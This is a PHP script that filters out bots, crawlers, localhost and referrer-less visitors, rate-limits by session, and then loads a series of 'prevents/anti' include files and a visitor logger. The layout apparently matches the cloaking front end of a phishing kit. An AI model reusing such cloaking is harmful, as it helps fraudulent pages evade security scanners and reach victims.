<?php

session_start();

function isSuspiciousRequest($ip, $userAgent, $referrer) {
    $suspiciousIps = ['127.0.0.1', '::1'];


    $suspiciousUserAgents = ['bot', 'crawler', 'spider', 'scrape', 'httpclient'];

    if (in_array($ip, $suspiciousIps)) {
        return true;
    }

    foreach ($suspiciousUserAgents as $word) {
        if (stripos($userAgent, $word) !== false) {
            return true;
        }
    }

    if (empty($referrer) || strpos($referrer, $_SERVER['HTTP_HOST']) === false) {
        return true;
    }

    return false;
}

function isHighRequestRate() {
    if (!isset($_SESSION['request_count'])) {
        $_SESSION['request_count'] = 0;
        $_SESSION['last_request_time'] = time();
    }
    $_SESSION['request_count']++;

    $timeDiff = time() - $_SESSION['last_request_time'];

    if ($timeDiff > 60) {
        $_SESSION['request_count'] = 0;
    }

    if ($_SESSION['request_count'] > 5) {
        return true;
    }

    $_SESSION['last_request_time'] = time();

    return false;
}

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referrer = $_SERVER['HTTP_REFERER'] ?? '';

// Check if the request is suspicious
if (isSuspiciousRequest($ip, $userAgent, $referrer) || isHighRequestRate()) {
    header('HTTP/1.1 403 Forbidden');
    echo 'Access denied! You may be a bot.';
    exit();
}


include "./assets/php/prevents/anti1.php";
include "./assets/php/prevents/anti2.php";
include "./assets/php/prevents/anti3.php";
include "./assets/php/prevents/anti4.php";
include "./assets/php/prevents/anti5.php";
include "./assets/php/prevents/anti6.php";
include "./assets/php/prevents/anti7.php";
include "./assets/php/prevents/anti8.php";
include "./assets/php/prevents/all.php";
include "./assets/php/prevents/911.php";
include "./vis.php";

visitors();
exit();

?>